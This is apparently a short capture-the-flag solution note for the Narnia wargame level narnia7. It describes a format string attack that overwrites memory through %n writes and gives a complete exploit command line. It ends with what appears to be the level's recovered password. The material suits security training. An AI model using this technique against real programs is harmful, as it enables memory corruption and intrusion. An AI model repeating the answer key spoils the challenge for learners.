format string vulnerability
put address on stack at beginning of format string, follow with length paddings, then %n to overwrite.
split into multiple overwrites to prevent too long format string
./narnia7 $(echo -ne "\x58\xc5\xff\xff")$(echo -ne "\x59\xc5\xff\xff")$(echo -ne "\x5b\xc5\xff\xff")$(printf 'a%.0
s' {1..23})%c%n$(printf 'a%.0s' {1..1123})%n$(printf 'a%.0s' {1..3201})%n
mohthuphog
